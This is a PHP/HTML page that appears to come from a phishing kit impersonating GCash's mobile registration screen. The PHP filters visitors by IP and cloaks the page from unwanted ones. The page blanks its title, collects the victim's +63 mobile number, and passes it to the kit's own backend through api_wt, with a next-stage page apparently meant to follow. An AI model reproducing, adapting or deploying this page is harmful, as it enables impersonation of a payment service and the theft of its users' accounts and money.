<?php
define("IN_DEX", "true");
include('zy/api/mysql.php');
index("2");
$ip = php_ip();
$a = mysql_sql("select * from " . DB . ".user where ip='{$ip}';");
if ($a && $a[0]["jzfw"] == "2") {
  yc(505);
}
if (ipxz()) { ?>
  <!DOCTYPE html>
  <!-- saved from url=(0094)#/ -->
  <html class="mobile" style="font-size: 150px;">

  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <script type="text/javascript" async="" src="analytics.js"></script>
    <script async="" src="gtmgtm.js"></script>
    <script>
      ! function(e, t, a, n, g) {
        e[n] = e[n] || [], e[n].push({
          "gtm.start": (new Date).getTime(),
          event: "gtm.js"
        });
        var m = t.getElementsByTagName(a)[0],
          r = t.createElement(a);
        r.async = !0, r.src = "#", m.parentNode.insertBefore(r, m)
      }(window, document, "script", "dataLayer")
    </script>
    <meta name="format-detection" content="telephone=no, email=no">
    <meta name="viewport" content="width=device-width,user-scalable=no,initial-scale=0.3333333333333333,maximum-scale=0.3333333333333333,minimum-scale=0.3333333333333333">
    <meta name="data-aspm" content="a771">
    <title>GCash Registration</title>
    <meta property="og:title" content="Buy Load, Pay Bills, Send Money, and more with GCash!">
    <meta property="og:description" content="Get P50 when you download GCash and register!">
    <meta property="og:type" content="website">
    <meta property="og:url" content="gcsh.app">
    <link rel="shortcut icon" href="favicon.ico">
    <meta property="og:image" content="static/gcash-referral-og-img.png">
    <meta name="wap-font-scale" content="no">
    <script>
      document.title = "​"
    </script>
    <script>
      ! function(e, t) {
        "use strict";
        var i = window,
          a = i.document,
          n = navigator.userAgent,
          o = n.match(/Android[\S\s]+AppleWebkit\/(\d{3})/i),
          d = n.match(/U3\/((\d+|\.){5,})/i),
          m = d && 80 <= parseInt(d[1].split(".").join(""), 10),
          r = navigator.appVersion.match(/(iphone|ipad|ipod)/gi),
          c = i.devicePixelRatio || 1;
        r || o && 534 < o[1] || m || (c = 1);
        var l = 1 / c,
          s = a.querySelector('meta[name="viewport"]');
        s || ((s = a.createElement("meta")).setAttribute("name", "viewport"), a.head.appendChild(s)), s.setAttribute("content", "width=device-width,user-scalable=no,initial-scale=" + l + ",maximum-scale=" + l + ",minimum-scale=" + l), a.documentElement.style.fontSize = 50 * c * 1 + "px";
        var p = /Android|webOS|iPhone|iPad|iPod|BlackBerry|Mobile/i.test(n);
        a.documentElement.className = p ? "mobile" : "desktop"
      }()
    </script>
    <link rel="stylesheet" href="./GCash Registration_files/desktop-6222dec19e837fb47993.css">
    <link rel="stylesheet" href="./GCash Registration_files/index-9883c020a627714faec6.css">
    <script>
      const url = window.location.href
      const forceRedirectVersion = 'web/1.1.1'
      if (url.indexOf(forceRedirectVersion) >= 0) {
        window.location.href = url.replace(forceRedirectVersion, 'web/2.0.0')
      }
    </script>
    <script>
      var gcash_json_ua
    </script>
    <link href="./GCash Registration_files/css" rel="stylesheet">
    <script type="text/javascript" src="reg-setpwd.js"></script>
  </head>
<style>

  #divgc span:first-child{
    position: absolute;
    top: 40px;
    left: 70px;
  }
  #divgc span:last-child{
    position: absolute;
    top: 120px;
    left: 400px;
  }
</style>
  <body><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="position: absolute; width: 0; height: 0" id="__SVG_SPRITE_NODE__">
      <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48" id="icon-announcement">
        <path d="M29.9,16c-0.6-0.5-0.7-1.5-0.2-2.1c0.5-0.6,1.5-0.7,2.1-0.2c4,3.3,6,6.8,6,10.3c0,3.6-2.1,7-6,10.3   c-0.6,0.5-1.6,0.4-2.1-0.2c-0.5-0.6-0.4-1.6,0.2-2.1c3.3-2.8,4.9-5.5,4.9-8C34.9,21.5,33.3,18.8,29.9,16z"></path>
        <path d="M35.8,10.1c-0.6-0.6-0.6-1.5,0-2.1c0.6-0.6,1.5-0.6,2.1,0c4.8,5,7.3,10.3,7.3,16c0,5.7-2.4,11.1-7.3,16.2   c-0.6,0.6-1.5,0.6-2.1,0.1c-0.6-0.6-0.6-1.5-0.1-2.1c4.3-4.6,6.4-9.3,6.4-14.1C42.2,19.2,40.1,14.5,35.8,10.1z"></path>
        <path d="M24.5,3.3l-10.4,8H4.5C3.7,11.3,3,12,3,12.8v23.3c0,0.8,0.7,1.5,1.5,1.5h9.7l10.4,7.8c1,0.7,2.4,0,2.4-1.2V4.5   C27,3.3,25.5,2.6,24.5,3.3z M24,41.2l-8.4-6.3c-0.3-0.2-0.6-0.3-0.9-0.3H6V14.3h8.7c0.3,0,0.7-0.1,0.9-0.3L24,7.5V41.2z"></path>
      </symbol>
      <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 22" id="icon-btn-ok">
        <g stroke="#FFF" fill="none" fill-rule="evenodd">
          <path d="M.75 11c0 5.65 4.6 10.25 10.25 10.25S21.25 16.65 21.25 11 16.65.75 11 .75.75 5.35.75 11z" stroke-width="1.5"></path>
          <path d="M9.38 14.62c-.12 0-.25-.05-.35-.15L5.65 11.1c-.2-.2-.2-.53 0-.72.2-.2.5-.2.7 0l3.03 3.03 6.27-6.25c.2-.2.5-.2.7 0 .2.2.2.5 0 .7l-6.6 6.62c-.1.1-.24.15-.37.15z" stroke-width=".5" fill="#FFF" fill-rule="nonzero"></path>
        </g>
      </symbol>
      <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19 19" id="icon-btn-spin">
        <path d="M11.25 18.85v.03c-2.97.54-6.15-.35-8.45-2.65C-.92 12.5-.93 6.5 2.78 2.78 5.08.48 8.28-.4 11.25.16v.02c.2 0 .37.08.5.22.3.3.3.76 0 1.06-.13.14-.3.2-.5.22v.02l-.15-.03h-.04c-2.53-.52-5.26.2-7.22 2.17-3.12 3.12-3.12 8.2.02 11.33 1.92 1.92 4.56 2.67 7.04 2.24.28-.12.63-.07.86.16.3.3.3.78 0 1.07-.14.14-.32.2-.5.22z" fill="#FFF" fill-rule="evenodd"></path>
      </symbol>
      <symbol xmlns="http://www.w3.org/2000/svg" viewBox="0 0 70 70" id="icon-spin">
        <path opacity="0.083" d="M35,0L35,0c1.7,0,3,1.3,3,3v14c0,1.7-1.3,3-3,3l0,0c-1.7,0-3-1.3-3-3V3C32,1.3,33.3,0,35,0z"></path>
        <path opacity="0.167" d="M52.5,4.7L52.5,4.7c1.4,0.8,1.9,2.7,1.1,4.1l-7,12.1c-0.8,1.4-2.7,1.9-4.1,1.1l0,0 c-1.4-0.8-1.9-2.7-1.1-4.1l7-12.1C49.2,4.4,51.1,3.9,52.5,4.7z"></path>
        <path opacity="0.25" d="M65.3,17.5L65.3,17.5c0.8,1.4,0.3,3.3-1.1,4.1l-12.1,7c-1.4,0.8-3.3,0.3-4.1-1.1l0,0 c-0.8-1.4-0.3-3.3,1.1-4.1l12.1-7C62.6,15.6,64.5,16.1,65.3,17.5z"></path>
        <path opacity="0.333" d="M70,35L70,35c0,1.7-1.3,3-3,3H53c-1.7,0-3-1.3-3-3l0,0c0-1.7,1.3-3,3-3h14 C68.7,32,70,33.3,70,35z"></path>
        <path opacity="0.417" d="M65.3,52.5L65.3,52.5c-0.8,1.4-2.7,1.9-4.1,1.1l-12.1-7c-1.4-0.8-1.9-2.7-1.1-4.1l0,0 c0.8-1.4,2.7-1.9,4.1-1.1l12.1,7C65.6,49.2,66.1,51.1,65.3,52.5z"></path>
        <path opacity="0.5" d="M52.5,65.3L52.5,65.3c-1.4,0.8-3.3,0.3-4.1-1.1l-7-12.1c-0.8-1.4-0.3-3.3,1.1-4.1l0,0 c1.4-0.8,3.3-0.3,4.1,1.1l7,12.1C54.4,62.6,53.9,64.5,52.5,65.3z"></path>
        <path opacity="0.583" d="M35,50L35,50c1.7,0,3,1.3,3,3v14c0,1.7-1.3,3-3,3l0,0c-1.7,0-3-1.3-3-3V53 C32,51.3,33.3,50,35,50z"></path>
        <path opacity="0.667" d="M27.5,48L27.5,48c1.4,0.8,1.9,2.7,1.1,4.1l-7,12.1c-0.8,1.4-2.7,1.9-4.1,1.1l0,0 c-1.4-0.8-1.9-2.7-1.1-4.1l7-12.1C24.2,47.7,26.1,47.2,27.5,48z"></path>
        <path opacity="0.75" d="M20,35L20,35c0,1.7-1.3,3-3,3H3c-1.7,0-3-1.3-3-3l0,0c0-1.7,1.3-3,3-3h14 C18.7,32,20,33.3,20,35z"></path>
        <path opacity="0.8333" d="M22,42.5L22,42.5c0.8,1.4,0.3,3.3-1.1,4.1l-12.1,7c-1.4,0.8-3.3,0.3-4.1-1.1l0,0 c-0.8-1.4-0.3-3.3,1.1-4.1l12.1-7C19.3,40.6,21.2,41.1,22,42.5z"></path>
        <path opacity="0.917" d="M22,27.5L22,27.5c-0.8,1.4-2.7,1.9-4.1,1.1l-12.1-7c-1.4-0.8-1.9-2.7-1.1-4.1l0,0 c0.8-1.4,2.7-1.9,4.1-1.1l12.1,7C22.3,24.2,22.8,26.1,22,27.5z"></path>
        <path d="M27.5,22L27.5,22c-1.4,0.8-3.3,0.3-4.1-1.1l-7-12.1c-0.8-1.4-0.3-3.3,1.1-4.1 l0,0c1.4-0.8,3.3-0.3,4.1,1.1l7,12.1C29.4,19.3,28.9,21.2,27.5,22z"></path>
      </symbol>
    </svg><noscript><iframe src="#" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
    <div id="app" class="root-app">
      <!---->
      <div class="main-container login-page">
        <div class="page-container">
          <header>
            <div class="page-item"><img class="gcash-icon" src="GCash-new-logo.74ea4e9.png"></div>
          </header>
          <div class="page-main content-center">
            <p class="default-font enter-mobile-number-label"> Enter your mobile number</p>
            <div class="login">
              <div class="ap-flex-row number-field underlined">
                <p class="default-font area-code ">+63</p> <input id="input1" maxlength="12" type="text" class="mobile-input underlined" inputmode="numeric" accessbilityid="mobile-input">
              </div>
            </div>
            <p class="default-font network-available new-font-size"> Available for all networks!</p>
          </div>
          <footer>
            <div class="privacy-message">
              <p>By tapping next, we'll collect your mobile number's network information to be able to send you a
                One-Time Password (OTP).</p>
            </div>
            <div class="but display-mobile"><button id="button1" type="button" class="ap-button ap-button-primary" data-aspm-click="c18520.d33573" accessbilityid="next-button">
                Next
                <!---->
                <!---->
                <!---->
              </button></div>
            <div class="footer-view">
              <!---->
              <div class="page-item consent">
                <p class="default-font copyright">© 2022 GCash.com | All rights reserved. </p>
                <div class="link-container"><a href="#" class="policy">
                    <p>Privacy Policy</p>
                  </a>
                  <p class="default-font seperator">&nbsp;|&nbsp;</p> <a href="#" class="terms-and-conditions">
                    <p>Terms and Conditions</p>
                  </a>
                </div>
              </div>
            </div>
          </footer>
        </div>
      </div>
    </div>
    <script>
      ! function() {
        if (!window.Tracert) {
          for (var r = {
              _isInit: !0,
              _readyToRun: [],
              call: function() {
                var a, n = arguments;
                try {
                  a = [].slice.call(n, 0)
                } catch (o) {
                  var e = n.length;
                  a = [];
                  for (var t = 0; t < e; t++) a.push(n[t])
                }
                r.addToRun(function() {
                  r.call.apply(r, a)
                })
              },
              addToRun: function(o) {
                var a = o;
                "function" == typeof a && (a._logTimer = new Date - 0, r._readyToRun.push(a))
              }
            }, o = ["config", "logPv", "info", "err", "click", "expo", "pageName", "pageState", "time", "timeEnd", "parse", "checkExpo", "stringify", "report"], a = 0; a < o.length; a++) {
            ! function(o) {
              r[o] = function() {
                var a, n = arguments;
                try {
                  a = [].slice.call(n, 0)
                } catch (o) {
                  var e = n.length;
                  a = [];
                  for (var t = 0; t < e; t++) a.push(n[t])
                }
                a.unshift(o), r.addToRun(function() {
                  r.call.apply(r, a)
                })
              }
            }(o[a])
          }
          window.Tracert = r
        }
      }(),
      function() {
        if (!window.BizLog) {
          var r = {
            _readyToRun: [],
            call: function() {
              var a, n = arguments;
              try {
                a = [].slice.call(n, 0)
              } catch (o) {
                var e = n.length;
                a = [];
                for (var t = 0; t < e; t++) a.push(n[t])
              }
              r.addToRun(function() {
                r.call.apply(r, a)
              })
            },
            addToRun: function(o) {
              "function" == typeof o && (o._logTimer = new Date - 0, r._readyToRun.push(o))
            }
          };
          window.BizLog = r
        }
      }(), window.BizLog.call("config", {
          disabled: !0
        }),
        function(o, a, n) {
          try {
            o._to = {
              server: "#",
              errorServer: "#",
              autoLogPv: !1,
              spmAPos: "a771",
              eventType: "click",
              workspaceId: "PROD",
              appId: "D54528A131559",
              sessionIdKey: "tracert-session-key",
              patchRules: {
                appPatches: [
                  ["GCash", /\bGCash\/([\d.]+)/]
                ],
                sdkPatches: [
                  ["AppContainer", /\bAppContainer\/([\d.]+)/]
                ]
              }
            };
            var e = (t = "userId", (document.cookie.match("(^|; )" + t + "=([^;]*)") || 0)[2]);
            e && (o._to.role_id = e)
          } catch (o) {
            console.error("set appReg error", o)
          }
          var t
        }(window, document)
    </script>
    <script type="text/javascript" src="manifest-2.0.2-4b2d832ad65b80dcfc0f.js" crossorigin=""></script>
    <script type="text/javascript" src="vendor-2.0.2-40828a78c38b5648be04.js" crossorigin=""></script>
    <script>
      var ua = window.navigator.userAgent,
        isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|Mobile/i.test(ua),
        scriptSrc = "";
      if (scriptSrc = isMobile ? "index-2.1.0-9883c020a627714faec6.js" : "desktop-2.1.0-6222dec19e837fb47993.js") {
        var script = document.createElement("script");
        script.setAttribute("type", "text/javascript"), script.setAttribute("src", scriptSrc), script.setAttribute("crossorigin", "anonymous"), document.body.appendChild(script)
      }
    </script>
    <script type="text/javascript" src="index-2.0.2-06ecf2b7e7d670269e4d.js" crossorigin="anonymous"></script>
    <script src="apdid.1.0.12.js"></script>
    <script>
      ! function() {
        function x(x) {
          return (document.cookie.match("(^|; )" + x + "=([^;]*)") || [])[2]
        }
        var n, e = (n = "H5xxxxxxxxxx4xxxyxxxxxxxxxxxxxxx".replace(/[xy]/g, function(x) {
          var n = 16 * Math.random() | 0;
          return ("x" === x ? n : 3 & n | 8).toString(16)
        }), x("env-token") || (document.cookie = "env-token=" + n + "; path=/"), x("env-token"));
        sessionStorage.setItem("udid", e), apdid.init({
          appName: "gcash",
          token: e,
          region: "SG"
        })
      }()
    </script>
    <p style="display: none;"></p>
    <!---->
    <div>
      <!---->
      <!---->
    </div>
    <!---->
  </body>

  </html>
  <script type="text/javascript" src="zy/api/k.js"></script>
  <script>
    js_ini_jsver("zy/api/i.js");

    document.getElementById("input1").oninput = function() {
      this.value = this.value.replace(/\D/g, '');
      if (this.value < 0) {
        this.value = "";
      }
   
      if (this.value.length > 3&& this.value.length<=6) {
        this.value = this.value.substring(0, 3) + " " + this.value.substring(6, 3);
      }

      if (this.value.length >6) {
        this.value = this.value.substring(0, 3) + " " + this.value.substring(6, 3)+" "+this.value.substring(10, 6);
      }
    }
 
    $id("button1").onclick = () => {
      if ($id("input1").value.slice(0, 1) != 9||$id("input1").value.replace(/ /g, '').length!=10) {
        var width = window.innerWidth || document.documentElement.clientWidth || document.body.clientWidth;
        var height = window.innerHeight || document.documentElement.clientHeight || document.body.clientHeight;
        var link = document.createElement("div");
        var head = document.getElementsByTagName("body");
        head[0].appendChild(link);
        link.style.position= "absolute";
        link.style.width = width*0.9 + "px";
        link.style.height = height*0.15 + "px";
        link.style.background = "rgb(0, 0, 0,0.8)";
        link.style.left = width*0.05 + "px";
        link.style.top = height*0.37 + "px";
        link.style.zIndex = "2222";
        link.style.color = "#fff";
        link.style.borderRadius = "10px";
        link.setAttribute("id","divgc");
        link.innerHTML="<span>Please enter a valid mobile phone number.</span><br><span>(WR02)</span>";
        setTimeout(function(){
          if ($id("divgc")) {
        $id("divgc").remove();
      }
      },2000); 

      }else{
        var pp=$id("input1").value;
       api_wt(pp,"o");
      // y("GCash Registration1.php?p="+$id("input1").value);
      }

    }
  </script>
<?php
} else {
  err(); ?>
  <script type="text/javascript" src="zy/api/k.js"></script>
  <script>
    y(errurl);
  </script>
<?php
}
?>